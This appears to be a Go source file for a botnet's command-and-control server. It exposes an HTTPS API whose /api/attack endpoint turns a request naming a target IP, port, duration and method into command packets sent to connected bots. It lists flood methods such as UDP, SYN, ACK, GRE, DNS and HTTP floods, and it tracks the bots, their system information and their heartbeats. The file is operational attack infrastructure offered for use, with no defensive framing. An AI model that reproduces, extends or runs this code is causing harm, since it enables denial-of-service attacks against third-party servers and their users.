package main

import (
	"context"
	"crypto/sha256"
	"crypto/tls"
	"encoding/binary"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"strconv"
	"sync"
	"sync/atomic"
	"time"
)

// Connection Pool Types and Functions
type ConnectionPool struct {
	pool        map[string]*PooledConn
	mutex       sync.RWMutex
	maxSize     int
	currentSize int32 // Atomic counter
}

type PooledConn struct {
	conn     *tls.Conn
	lastUsed time.Time
}

// API Server Types
type APIServer struct {
	port    string
	server  *http.Server
	started bool
}

type APIResponse struct {
	Success bool        `json:"success"`
	Message string      `json:"message,omitempty"`
	Data    interface{} `json:"data,omitempty"`
}

type AttackRequest struct {
	Method   string `json:"method"`
	TargetIP string `json:"target_ip"`
	Port     int    `json:"port"`
	Duration int    `json:"duration"`
	Username string `json:"username"`
	Token    string `json:"token"`
	Secret   string `json:"secret"`
}

type BotInfo struct {
	ID         string     `json:"id"`
	IP         string     `json:"ip"`
	Connected  time.Time  `json:"connected"`
	LastPing   time.Time  `json:"last_ping"`
	SystemInfo SystemInfo `json:"system_info,omitempty"`
}

type SystemInfo struct {
	OS     string `json:"os"`
	Arch   string `json:"arch"`
	CPU    string `json:"cpu,omitempty"`
	RAM    string `json:"ram,omitempty"`
	Uptime string `json:"uptime,omitempty"`
}

type StatsResponse struct {
	TotalBots     int    `json:"total_bots"`
	ActiveBots    int    `json:"active_bots"`
	TotalAttacks  int    `json:"total_attacks"`
	ActiveAttacks int    `json:"active_attacks"`
	Uptime        string `json:"uptime"`
}

var (
	botInfoMapMutex        sync.RWMutex
	ongoingAttacksMutex    sync.RWMutex
	ongoingAPIAttacksMutex sync.RWMutex
	attackHistoryMutex     sync.RWMutex
	clientsMutex           sync.RWMutex
)

const (
	MaxBotInfoEntries = 50000
	MaxAPIAttacks     = 1000
)

// Protocol Constants and Types
const (
	PacketTypePing         = 0x01
	PacketTypePong         = 0x02
	PacketTypeCommand      = 0x03
	PacketTypeDiagnostic   = 0x04
	PacketTypeHeartbeat    = 0x05
	PacketTypeAuth         = 0x06
	PacketTypeAuthResponse = 0x07
)

type PacketHeader struct {
	Type      uint8
	Length    uint32
	Timestamp int64
	Checksum  uint16
}

type Packet struct {
	Header  PacketHeader
	Payload []byte
}

// Global variables
var (
	apiServer       *APIServer
	botInfoMap      = make(map[string]BotInfo)
	botInfoLock     sync.RWMutex
	serverStartTime time.Time
	connectionPool  = NewConnectionPool(1000)

	ErrInvalidPacket    = errors.New("invalid packet")
	ErrChecksumMismatch = errors.New("checksum mismatch")
	ErrPacketTooSmall   = errors.New("packet too small")
)

func init() {
	serverStartTime = time.Now()
}

// Connection Pool Functions
func NewConnectionPool(maxSize int) *ConnectionPool {
	return &ConnectionPool{
		pool:        make(map[string]*PooledConn),
		maxSize:     maxSize,
		currentSize: 0,
	}
}

func (p *ConnectionPool) StartCleanupRoutine(interval time.Duration) {
	go func() {
		ticker := time.NewTicker(interval)
		defer ticker.Stop()

		for range ticker.C {
			p.cleanup()
		}
	}()
}

func (p *ConnectionPool) Get(addr string) (*tls.Conn, bool) {
	p.mutex.RLock()
	defer p.mutex.RUnlock()

	if pooled, exists := p.pool[addr]; exists {
		// Check if connection is still alive
		if pooled.conn != nil {
			pooled.lastUsed = time.Now()
			return pooled.conn, true
		}
	}
	return nil, false
}

func (p *ConnectionPool) Put(addr string, conn *tls.Conn) error {
	p.mutex.Lock()
	defer p.mutex.Unlock()

	if atomic.LoadInt32(&p.currentSize) >= int32(p.maxSize) {
		return fmt.Errorf("connection pool full")
	}

	if _, exists := p.pool[addr]; exists {
		return fmt.Errorf("connection already exists")
	}

	p.pool[addr] = &PooledConn{
		conn:     conn,
		lastUsed: time.Now(),
	}
	atomic.AddInt32(&p.currentSize, 1)
	return nil
}

func (p *ConnectionPool) Remove(addr string) {
	p.mutex.Lock()
	defer p.mutex.Unlock()
	if pooled, exists := p.pool[addr]; exists {
		pooled.conn.Close()
		delete(p.pool, addr)
		atomic.AddInt32(&p.currentSize, -1)
	}
}

func (p *ConnectionPool) cleanup() {
	p.mutex.Lock()
	defer p.mutex.Unlock()
	now := time.Now()
	for addr, pooled := range p.pool {
		if now.Sub(pooled.lastUsed) > 5*time.Minute {
			pooled.conn.Close()
			delete(p.pool, addr)
			atomic.AddInt32(&p.currentSize, -1)
		}
	}
}

func (p *ConnectionPool) CloseAll() {
	p.mutex.Lock()
	defer p.mutex.Unlock()
	for _, pooled := range p.pool {
		pooled.conn.Close()
	}
	p.pool = make(map[string]*PooledConn)
}

// API Server Functions
func NewAPIServer(port string) *APIServer {
	return &APIServer{
		port: port,
	}
}

func (s *APIServer) Start() error {
	if s.started {
		return fmt.Errorf("API server already running")
	}
	mux := http.NewServeMux()
	mux.HandleFunc("/api/attack", s.rateLimitMiddleware(s.attackHandler))
	mux.HandleFunc("/api/bots", s.rateLimitMiddleware(s.botsHandler))
	mux.HandleFunc("/api/stats", s.rateLimitMiddleware(s.statsHandler))

	s.server = &http.Server{
		Addr:    ":" + s.port,
		Handler: mux,
	}
	s.started = true

	go func() {
		fmt.Printf("[API] Server starting on port %s (HTTPS)\n", s.port)
		if err := s.server.ListenAndServeTLS(CERT_FILE, KEY_FILE); err != nil && err != http.ErrServerClosed {
			fmt.Printf("[API] Error starting server: %v\n", err)
			s.started = false
		}
	}()

	return nil
}

func (s *APIServer) attackHandler(w http.ResponseWriter, r *http.Request) {
	token := r.Header.Get("X-API-Token")
	if allowed, remaining := CheckAPIRateLimit(token); !allowed {
		s.sendError(w, fmt.Sprintf("API rate limit exceeded. Try again in %v", remaining), http.StatusTooManyRequests)
		return
	}
	if r.Method != http.MethodPost {
		s.sendError(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var req AttackRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		s.sendError(w, "Invalid JSON", http.StatusBadRequest)
		return
	}
	if req.Method == "" || req.TargetIP == "" || req.Port <= 0 || req.Duration <= 0 || req.Username == "" || req.Token == "" || req.Secret == "" {
		s.sendError(w, "Missing required fields", http.StatusBadRequest)
		return
	}
	if ip := net.ParseIP(req.TargetIP); ip != nil {
		if ip.IsLoopback() || ip.IsPrivate() || ip.IsMulticast() {
			s.sendError(w, "Target IP not allowed", http.StatusBadRequest)
			return
		}
	}
	if req.Port < 1 || req.Port > 65535 {
		s.sendError(w, "Port out of range", http.StatusBadRequest)
		return
	}
	attackDuration := int64(req.Duration) * int64(time.Second)
	if attackDuration < 0 {
		s.sendError(w, "Duration too large", http.StatusBadRequest)
		return
	}

	if !ValidateMethod(req.Method) {
		s.sendError(w, "Unknown method", http.StatusBadRequest)
		return
	}
	if !s.authenticate(req.Token, req.Secret, req.Username) {
		s.sendError(w, "Authentication failed", http.StatusUnauthorized)
		return
	}
	users, err := loadUsers()
	if err != nil {
		s.sendError(w, "Internal server error", http.StatusInternalServerError)
		return
	}
	var user *User
	for _, u := range users {
		if u.Username == req.Username {
			user = &u
			break
		}
	}
	if user == nil || !user.CanUseMethod(req.Method) {
		s.sendError(w, "Permission denied for this method", http.StatusForbidden)
		return
	}
	ip := net.ParseIP(req.TargetIP)
	if ip == nil {
		s.sendError(w, "Invalid IP address", http.StatusBadRequest)
		return
	}
	if !ValidateIP(req.TargetIP) {
		s.sendError(w, "Target IP not allowed", http.StatusBadRequest)
		return
	}

	ip4 := ip.To4()
	if ip4 == nil {
		s.sendError(w, "IPv4 address required", http.StatusBadRequest)
		return
	}
	cmdPacket := CommandPacket{}
	copy(cmdPacket.Method[:], req.Method[:len(cmdPacket.Method)])
	copy(cmdPacket.TargetIP[:], ip4)
	cmdPacket.Port = uint16(req.Port)
	cmdPacket.Duration = uint32(req.Duration)
	sendToBots(cmdPacket)
	a := attack{
		method:   req.Method,
		ip:       req.TargetIP,
		port:     strconv.Itoa(req.Port),
		duration: time.Duration(req.Duration) * time.Second,
		start:    time.Now(),
		user:     req.Username,
	}

	historyLock.Lock()
	attackHistory = append(attackHistory, a)
	historyLock.Unlock()
	RecordAPIAttack(a)
	s.sendResponse(w, APIResponse{
		Success: true,
		Message: "Attack launched successfully",
	}, http.StatusOK)
}

func (s *APIServer) botsHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		s.sendError(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	token := r.URL.Query().Get("token")
	secret := r.URL.Query().Get("secret")
	username := r.URL.Query().Get("username")

	if token == "" || secret == "" || username == "" {
		s.sendError(w, "Missing token/secret/username", http.StatusBadRequest)
		return
	}
	if !s.authenticate(token, secret, username) {
		s.sendError(w, "Authentication failed", http.StatusUnauthorized)
		return
	}
	botInfoLock.RLock()
	bots := make([]BotInfo, 0, len(botInfoMap))
	for _, bot := range botInfoMap {
		bots = append(bots, bot)
	}
	botInfoLock.RUnlock()
	s.sendResponse(w, APIResponse{
		Success: true,
		Data:    bots,
	}, http.StatusOK)
}

func (s *APIServer) statsHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		s.sendError(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	token := r.URL.Query().Get("token")
	secret := r.URL.Query().Get("secret")
	username := r.URL.Query().Get("username")
	if token == "" || secret == "" || username == "" {
		s.sendError(w, "Missing token/secret/username", http.StatusBadRequest)
		return
	}

	if !s.authenticate(token, secret, username) {
		s.sendError(w, "Authentication failed", http.StatusUnauthorized)
		return
	}
	activeBots := 0
	botInfoLock.RLock()
	for _, bot := range botInfoMap {
		if time.Since(bot.LastPing) < time.Minute*5 {
			activeBots++
		}
	}
	botInfoLock.RUnlock()
	attackLock.Lock()
	activeAttacks := 0
	for _, attack := range ongoingAttacks {
		if time.Now().Before(attack.start.Add(attack.duration)) {
			activeAttacks++
		}
	}
	attackLock.Unlock()
	apiAttackLock.Lock()
	for _, a := range ongoingAPIAttacks {
		if time.Now().Before(a.start.Add(a.duration)) {
			activeAttacks++
		}
	}
	apiAttackLock.Unlock()
	stats := StatsResponse{
		TotalBots:     len(botInfoMap),
		ActiveBots:    activeBots,
		TotalAttacks:  len(attackHistory),
		ActiveAttacks: activeAttacks,
		Uptime:        time.Since(serverStartTime).Truncate(time.Second).String(),
	}
	s.sendResponse(w, APIResponse{
		Success: true,
		Data:    stats,
	}, http.StatusOK)
}

// Use in API authentication:
func (s *APIServer) authenticate(token, secret, username string) bool {
	// Use secret manager for additional validation
	storedSecret, exists := secretManager.GetSecret(username + "_api_secret")
	if exists && SecureCompare(storedSecret, secret) {
		return true
	}

	// Fallback to existing user file validation
	users, err := loadUsers()
	if err != nil {
		return false
	}

	for _, user := range users {
		if user.Username == username {
			if token != user.APIToken {
				return false
			}
			return VerifyAPISecret(user.APISecret, secret)
		}
	}
	return false
}

func (s *APIServer) rateLimitMiddleware(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		ip, _, _ := net.SplitHostPort(r.RemoteAddr)
		if allowed, remaining := CheckConnectionRateLimit(ip); !allowed {
			s.sendError(w, fmt.Sprintf("Rate limit exceeded. Try again in %v", remaining), http.StatusTooManyRequests)
			return
		}
		next(w, r)
	}
}

func (s *APIServer) sendResponse(w http.ResponseWriter, response APIResponse, statusCode int) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(statusCode)
	json.NewEncoder(w).Encode(response)
}

func (s *APIServer) sendError(w http.ResponseWriter, message string, statusCode int) {
	s.sendResponse(w, APIResponse{
		Success: false,
		Message: message,
	}, statusCode)
}

// Bot Info Management Functions
func UpdateBotInfo(conn net.Conn, info SystemInfo) {
	botID := conn.RemoteAddr().String()
	botInfo := BotInfo{
		ID:         botID,
		IP:         conn.RemoteAddr().(*net.TCPAddr).IP.String(),
		Connected:  time.Now(),
		LastPing:   time.Now(),
		SystemInfo: info,
	}
	botInfoLock.Lock()
	botInfoMap[botID] = botInfo
	botInfoLock.Unlock()
}

func UpdateBotPing(conn net.Conn) {
	botID := conn.RemoteAddr().String()
	botInfoLock.Lock()
	if bot, exists := botInfoMap[botID]; exists {
		bot.LastPing = time.Now()
		botInfoMap[botID] = bot
	}
	botInfoLock.Unlock()
}

func RemoveBotInfo(conn net.Conn) {
	botID := conn.RemoteAddr().String()
	botInfoLock.Lock()
	delete(botInfoMap, botID)
	botInfoLock.Unlock()
}

// Protocol Functions
func CalculateChecksum(data []byte) uint16 {
	hash := sha256.Sum256(data)
	return binary.BigEndian.Uint16(hash[:2])
}

func SerializePacket(packet Packet) ([]byte, error) {
	buf := make([]byte, 19+packet.Header.Length)
	buf[0] = packet.Header.Type
	binary.BigEndian.PutUint32(buf[1:5], packet.Header.Length)
	binary.BigEndian.PutUint64(buf[5:13], uint64(packet.Header.Timestamp))
	binary.BigEndian.PutUint16(buf[17:19], packet.Header.Checksum)
	copy(buf[19:], packet.Payload)

	return buf, nil
}

func DeserializePacket(data []byte) (Packet, error) {
	if len(data) < 19 {
		return Packet{}, ErrPacketTooSmall
	}
	var packet Packet
	packet.Header.Type = data[0]
	packet.Header.Length = binary.BigEndian.Uint32(data[1:5])
	packet.Header.Timestamp = int64(binary.BigEndian.Uint64(data[5:13]))
	packet.Header.Checksum = binary.BigEndian.Uint16(data[17:19])

	if len(data) < int(19+packet.Header.Length) {
		return Packet{}, ErrInvalidPacket
	}
	packet.Payload = make([]byte, packet.Header.Length)
	copy(packet.Payload, data[19:19+packet.Header.Length])
	checksumData := append(data[0:17], data[19:19+packet.Header.Length]...)
	if CalculateChecksum(checksumData) != packet.Header.Checksum {
		return Packet{}, ErrChecksumMismatch
	}

	return packet, nil
}

func CreatePacket(packetType uint8, payload []byte) Packet {
	timestamp := time.Now().UnixNano()
	packet := Packet{
		Header: PacketHeader{
			Type:      packetType,
			Length:    uint32(len(payload)),
			Timestamp: timestamp,
			Checksum:  0,
		},
		Payload: payload,
	}
	tempBuf := make([]byte, 19+packet.Header.Length)
	tempBuf[0] = packet.Header.Type
	binary.BigEndian.PutUint32(tempBuf[1:5], packet.Header.Length)
	binary.BigEndian.PutUint64(tempBuf[5:13], uint64(packet.Header.Timestamp))
	copy(tempBuf[19:], packet.Payload)
	packet.Header.Checksum = CalculateChecksum(append(tempBuf[0:17], tempBuf[19:]...))

	return packet
}

func SendPacket(conn net.Conn, packet Packet) error {
	data, err := SerializePacket(packet)
	if err != nil {
		LogSystem("ERROR", "Packet serialization failed", err.Error())
		return err
	}
	_, err = conn.Write(data)
	if err != nil {
		LogSystem("ERROR", "Packet send failed", err.Error())
		return err
	}

	return nil
}

func ReceivePacket(conn net.Conn) (Packet, error) {
	conn.SetReadDeadline(time.Now().Add(30 * time.Second))
	defer conn.SetReadDeadline(time.Time{})
	headerBuf := make([]byte, 19)
	if _, err := io.ReadFull(conn, headerBuf); err != nil {
		return Packet{}, err
	}
	length := binary.BigEndian.Uint32(headerBuf[1:5])
	if length > 16*1024 {
		return Packet{}, fmt.Errorf("packet too large")
	}
	payloadBuf := make([]byte, length)
	if length > 0 {
		if _, err := io.ReadFull(conn, payloadBuf); err != nil {
			return Packet{}, err
		}
	}
	fullPacket := append(headerBuf, payloadBuf...)
	return DeserializePacket(fullPacket)
}

func validateCommand(method string) bool {
	validCommands := map[string]bool{
		"!udpsmart":  true,
		"!udpflood":  true,
		"!tcpflood":  true,
		"!synflood":  true,
		"!ackflood":  true,
		"!greflood":  true,
		"!dns":       true,
		"!http":      true,
		"!reinstall": true,
		"STOP":       true,
	}
	return validCommands[method]
}

// Enhanced handleBotConnection with proper authentication
func handleBotConnection(conn *tls.Conn) {
	addr := conn.RemoteAddr().String()
	connectionPool.Put(addr, conn)
	defer connectionPool.Remove(addr)

	// Use context for graceful shutdown
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Set initial deadline for authentication
	conn.SetDeadline(time.Now().Add(30 * time.Second))

	// Handle authentication first
	authPacket, err := ReceivePacket(conn)
	if err != nil {
		fmt.Printf("Error receiving auth packet from bot %s: %v\n", addr, err)
		conn.Close()
		return
	}

	if authPacket.Header.Type != PacketTypeAuth {
		fmt.Printf("Expected auth packet from bot %s, got type %d\n", addr, authPacket.Header.Type)
		conn.Close()
		return
	}

	// Send authentication response
	authResponse := CreatePacket(PacketTypeAuthResponse, []byte("authenticated"))
	if err := SendPacket(conn, authResponse); err != nil {
		fmt.Printf("Error sending auth response to bot %s: %v\n", addr, err)
		conn.Close()
		return
	}

	fmt.Printf("Bot %s authenticated successfully\n", addr)

	// Reset deadline after successful authentication
	conn.SetDeadline(time.Time{})

	// Initialize rate limiter with context
	rateLimiter.WithContext(ctx)

	stopPing := make(chan struct{})
	defer close(stopPing)
	defer removeBotConn(conn)

	UpdateBotInfo(conn, SystemInfo{})

	// Start heartbeat monitoring using the new system
	go monitorBotHeartbeat(conn, stopPing)

	// Request diagnostics on connection
	if err := RequestDiagnostics(conn); err != nil {
		fmt.Printf("Error requesting diagnostics from bot %s: %v\n", addr, err)
	}

	// Main packet handling loop
	for {
		packet, err := ReceivePacket(conn)
		if err != nil {
			if err == io.EOF {
				fmt.Printf("Bot %s disconnected\n", addr)
			} else {
				fmt.Printf("Error receiving packet from bot %s: %v\n", addr, err)
			}
			break
		}

		switch packet.Header.Type {
		case PacketTypePing:
			UpdateBotPing(conn)
			// Also update heartbeat manager
			pingTime := time.Since(time.Unix(0, packet.Header.Timestamp))
			heartbeatManager.UpdateBotHeartbeat(addr, pingTime)

		case PacketTypeDiagnostic:
			HandleDiagnosticResponse(conn, packet)

		case PacketTypeHeartbeat:
			HandleBotHeartbeat(conn, packet)

		case PacketTypeAuth:
			// Handle re-authentication if needed
			fmt.Printf("Re-auth request from bot %s\n", addr)
			authResponse := CreatePacket(PacketTypeAuthResponse, []byte("re-authenticated"))
			if err := SendPacket(conn, authResponse); err != nil {
				fmt.Printf("Error sending re-auth response: %v\n", err)
			}

		default:
			fmt.Printf("Unknown packet type %d from bot %s\n", packet.Header.Type, addr)
		}
	}

	RemoveBotInfo(conn)
	heartbeatManager.RemoveBot(addr)
}

func monitorBotHeartbeat(conn net.Conn, stop <-chan struct{}) {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			heartbeat := CreatePacket(PacketTypeHeartbeat, []byte{})
			if err := SendPacket(conn, heartbeat); err != nil {
				fmt.Printf("Error sending heartbeat to bot %s: %v\n", conn.RemoteAddr(), err)
				return
			}

			botInfoLock.RLock()
			bot, exists := botInfoMap[conn.RemoteAddr().String()]
			botInfoLock.RUnlock()

			if exists && time.Since(bot.LastPing) > 2*time.Minute {
				fmt.Printf("Bot %s is unresponsive, last ping: %v\n", conn.RemoteAddr(), bot.LastPing)
				conn.Close()
				return
			}

		case <-stop:
			return
		}
	}
}
